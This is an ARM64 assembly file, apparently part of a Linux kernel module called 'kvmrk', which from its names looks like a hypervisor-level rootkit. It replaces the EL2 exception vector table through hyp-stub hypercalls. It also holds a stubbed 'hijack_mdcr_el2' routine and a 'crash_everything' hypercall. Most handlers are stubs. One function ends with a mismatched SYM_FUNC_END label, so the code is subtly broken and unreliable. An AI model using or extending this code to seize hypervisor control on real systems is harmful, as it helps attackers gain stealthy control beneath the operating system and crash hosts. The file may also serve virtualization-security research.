#include <linux/init.h>
#include <linux/linkage.h>

#include <asm/assembler.h>
#include <asm/el2_setup.h>
#include <asm/kvm_arm.h>
#include <asm/kvm_asm.h>
#include <asm/ptrace.h>
#include <asm/virt.h>


#include "include/kvmrk.h"

	.text
	.align 11

SYM_CODE_START(kvmrk_vectors)
    ventry	el2_sync_invalid		// Synchronous EL2t
    ventry	el2_irq_invalid			// IRQ EL2t
    ventry	el2_fiq_invalid			// FIQ EL2t
    ventry	el2_error_invalid		// Error EL2t

    ventry	el2_sync_invalid		// Synchronous EL2h
    ventry	el2_irq_invalid			// IRQ EL2h
    ventry	el2_fiq_invalid			// FIQ EL2h
    ventry	el2_error_invalid		// Error EL2h

    ventry	handle_trap_el1			// Synchronous 64-bit EL1
    ventry	el1_irq_invalid			// IRQ 64-bit EL1
    ventry	el1_fiq_invalid			// FIQ 64-bit EL1
    ventry	el1_error_invalid		// Error 64-bit EL1

    ventry	el1_sync_invalid		// Synchronous 32-bit EL1
    ventry	el1_irq_invalid			// IRQ 32-bit EL1
    ventry	el1_fiq_invalid			// FIQ 32-bit EL1
    ventry	el1_error_invalid		// Error 32-bit EL1
SYM_CODE_END(kvmrk_vectors)

	.align 11
SYM_CODE_START_LOCAL(handle_trap_el1)
	eret
SYM_CODE_END(handle_trap_el1)

SYM_CODE_START(hijack_mdcr_el2)
    // mrs     x0, mdcr_el2
    // orr     x0, x0, #MDCR_EL2_TDA
    // msr     mdcr_el2, x0
    eret
SYM_CODE_END(hijack_mdcr_el2)

/* see: https://elixir.bootlin.com/linux/v5.15/source/arch/arm64/kernel/hyp-stub.S#L173 */
.macro invalid_vector	label
SYM_CODE_START_LOCAL(\label)
	b \label
SYM_CODE_END(\label)
.endm

	invalid_vector	el2_sync_invalid
	invalid_vector	el2_irq_invalid
	invalid_vector	el2_fiq_invalid
	invalid_vector	el2_error_invalid
	invalid_vector	el1_sync_invalid
	invalid_vector	el1_irq_invalid
	invalid_vector	el1_fiq_invalid
	invalid_vector	el1_error_invalid

/*
x10 *hopefully* wont get clobbered by HVC_RESET_VECTORS
see: https://elixir.bootlin.com/linux/latest/source/arch/arm64/kernel/hyp-stub.S#L200
*/
SYM_FUNC_START(kvmrk_replace_vbar_el2)
    add     x10, xzr, x0
    mov     x0, #HVC_RESET_VECTORS
    hvc     #0

    mov     x0, #HVC_SET_VECTORS
    add     x1, xzr, x10
    hvc     #0
    ret
SYM_FUNC_END(kvmrk_replace_vbar_el2)

SYM_FUNC_START(kvmrk_call_hyp)
    add     x1, xzr, x0
    mov     x0, #KVMRK_CALL_HYP
    hvc     #0
    ret
SYM_FUNC_END(kvmrk_call_hyp)

SYM_FUNC_START(kvmrk_crash_everything)
    mov     x0, #KVMRK_CRASH_EVERYTHING
    hvc     #0
    ret
SYM_FUNC_END(kvmrk_call_hyp)
